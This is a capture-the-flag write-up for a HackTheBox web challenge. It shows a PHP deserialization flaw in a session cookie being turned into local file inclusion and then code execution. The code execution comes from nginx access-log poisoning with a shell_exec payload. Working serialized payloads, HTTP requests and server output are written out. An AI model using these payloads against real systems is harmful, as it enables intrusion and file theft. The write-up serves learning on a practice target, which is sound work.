# [Toxic](https://app.hackthebox.com/challenges/toxic)

## CHALLENGE DESCRIPTION

Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸

## Scan

Burpsuite scanner: detected `Serialized object in HTTP message`.

- `PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9`
- decoded: `O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}`

## Source code review

user controlled parameter (`file` attribute in serialized `PageModel` object) is passed to `include()` method:

```php
<?php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
```

=> LFI, RFI

## test LFI

LFI:

- `O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}`

  ```text
  root:x:0:0:root:/root:/bin/ash
  bin:x:1:1:bin:/bin:/sbin/nologin
  daemon:x:2:2:daemon:/sbin:/sbin/nologin
  adm:x:3:4:adm:/var/adm:/sbin/nologin
  lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
  ...
  ```

=> we can read arbitrary file at the server, but we don't know the flag file name

## find flag file name

failed attempts: use wrappers (`http`, `https`, `glob`, ...)

then i found a way to exploit LFI at [this blog](https://null-byte.wonderhowto.com/how-to/exploit-php-file-inclusion-web-apps-0179955/). they send a request containing php code, this php code will be saved in apache log file `/var/log/apache2/access.log`, then access the log file via lfi vulnerability, the php code inside the log file will be executed.

in our case there is also an nginx log file, named `/var/log/nginx/access.log`

- 1. inject php code to log file:

```http
GET /<?php echo shell_exec('ls /'); ?> HTTP/1.1
```

- 2. access nginx log file:

  ```http
  GET / HTTP/1.1
  Host: 209.97.185.157:32572
  Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ%3d%3d
  ```

  - b64-decoded PHPSESSID: `O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}`
  - response:

    ```http
    HTTP/1.1 200 OK
    Server: nginx
    Date: Thu, 16 Feb 2023 18:04:44 GMT
    Content-Type: text/html; charset=UTF-8
    X-Powered-By: PHP/7.4.15
    Content-Length: 1690

    209.97.185.157 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36"
    ...
    dev
    entrypoint.sh
    etc
    flag_PwhOA
    home
    lib
    media
    mnt
    opt
    proc
    root
    run
    sbin
    srv
    sys
    tmp
    usr
    var
    www
    ```

=> we found that the flag file name is `flag_PwhOA`

## get flag

send a request with cookie PHPSESSID = b64-encode(`O:9:"PageModel":1:{s:4:"file";s:11:"/flag_PwhOA";}`)

=> response = flag

## References

exloit lfi: <https://null-byte.wonderhowto.com/how-to/exploit-php-file-inclusion-web-apps-0179955/>
